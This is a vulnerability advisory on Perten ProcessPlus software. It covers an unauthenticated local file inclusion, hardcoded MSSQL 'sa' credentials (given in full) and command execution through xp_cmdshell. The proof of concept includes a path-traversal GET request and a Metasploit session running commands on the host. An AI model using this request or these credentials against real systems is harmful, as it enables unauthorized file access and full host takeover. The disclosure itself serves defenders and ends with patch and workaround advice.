# Multiple Vulnerabilities in Perten ProcessPlus

The ProcessPlus measurement software is prone to local file inclusion, uses default MSSQL credentials, and is executed with unnecessarily high privileges.

## Vendor description

### Vulnerable versions

ProcessPlus Software / <=1.11.6507.0

#### Vulnerability overview

1) Unauthenticated Local File Inclusion (CVE-2024-6911)

A LFI was identified in the web interface of the device. An attacker can use this vulnerability to read system-wide files and configuration.

2) Hardcoded MSSQL Credentials (CVE-2024-6912)

The software is using the same MSSQL credentials across multiple installations. In combination with 3), this allows an attacker to fully compromise the host.

3) Execution with Unnecessary Privileges (CVE-2024-6913)

The software uses the user âsaâ to connect to the database. Access to this account allows an attacker to execute commands via the âxp\_cmdshellâ procedure.

#### Proof of Concept

##### 1) Unauthenticated Local File Inclusion (CVE-2024-6911)

The LFI can be triggered by using the following GET Request:

```
GET /ProcessPlus/Log/Download/?filename=..\..\..\..\..\..\Windows\System32\drivers\etc\hosts&filenameWithSerialNumber=_Errors_2102162.log HTTP/1.1
Host: 192.168.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
```

This example returns the content from âC:\Windows\System32\drivers\etc\hostsâ of an affected installation.

##### 2) Hardcoded MSSQL Credentials (CVE-2024-6912)

Analysis across multiple installations show that the configuration file â\ProgramData\Perten\ProcessPlus\OPCDA\_SERVER.xmlâ contains credentials:

```
[â¦]
<OPCDA_Server dbconnectstring=âDriver={SQL Server};SERVER=.\PertenSQL;
DATABASE=ProcessPlus_OPC;UID=sa;PWD=enilnoâ application_id=â1â³
appid=âPerten.OPCDA.Serverâ loglevel=âinfoâ
logfile=âC:\Perten\ProcessPlus\Log\opcserver.logâ>
[â¦]
```

These credentials âsa:enilnoâ were re-used in all reviewed installations.

##### 3) Execution with Unnecessary Privileges (CVE-2024-6913)

The application uses the âsaâ user to authenticate with the database. By using Metasploit an attacker can execute arbitrary commands:

```
msf6 auxiliary(admin/mssql/mssql_exec) > show options
Module options (auxiliary/admin/mssql/mssql_exec):
Name Current Setting
â- âââââ
CMD dir
PASSWORD enilno
RHOSTS 192.168.0.1
RPORT 1433
TDSENCRYPTION false
TECHNIQUE xp_cmdshell
USERNAME sa
USE_WINDOWS_AUTHENT false
msf6 auxiliary(admin/mssql/mssql_exec) > run
[*] Running module against 192.168.0.1
[*] 192.168.0.1:1433 â SQL Query: EXEC master..xp_cmdshell âdirâ
[â¦]
Directory of C:\Windows\system32

01/23/2024 13:37 AM 308 @AudioToastIcon.png
[â¦]
```

#### Solution

Update to version 2.0.0.

#### Workaround

Restrict network access to the host with the installed software. Change the default credentials of the database in the config file and the database itself.

#### Recommendation

CyberDanube recommends Perten customers to upgrade the software to the latest version available and to restrict network access to the management interface.
